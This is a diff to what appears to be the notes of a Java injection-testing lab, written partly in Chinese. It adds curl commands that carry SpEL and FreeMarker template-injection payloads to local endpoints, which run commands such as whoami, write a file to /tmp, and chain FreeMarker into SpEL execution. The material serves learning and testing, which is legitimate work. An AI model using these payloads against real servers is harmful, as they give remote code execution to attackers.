@@ -27,7 +27,11 @@ curl 127.0.0.1:8080/ognl/parse -d 'expression=#a%3d(new java.lang.ProcessBuilder
 #### spel
 
 ```
+# 普通执行
 curl 127.0.0.1:8080/spel/parse -d 'expression=T(java.lang.Runtime).getRuntime().exec("open /System/Applications/Calculator.app")'
+
+# 读取输出: 用getErrorStream()读取stderr
+curl 127.0.0.1:8080/spel/parse -d 'expression=new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("bash", "-c", "whoami").start().getInputStream(), "utf8")).readLine()'
 ```
 
 #### mvel
@@ -102,6 +106,18 @@ eval模式
 
 ```
 curl 127.0.0.1:8080/freemarker/eval -d 'username="freemarker.template.utility.Execute"?new()("open /System/Applications/Calculator.app")'
+```
+
+写文件
+
+```
+curl 127.0.0.1:8080/freemarker/eval -d 'username="freemarker.template.utility.ObjectConstructor"?new()("java.io.FileWriter","/tmp/test.txt").append("123").close()'
+```
+
+执行SPEL
+
+```
+curl 127.0.0.1:8080/freemarker/unsafe -d 'template=${"freemarker.template.utility.ObjectConstructor"?new()("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("T(java.lang.Runtime).getRuntime().exec(\"open /System/Applications/Calculator.app\")").getValue()}'
 ```
 
 #### thymeleaf模板注入
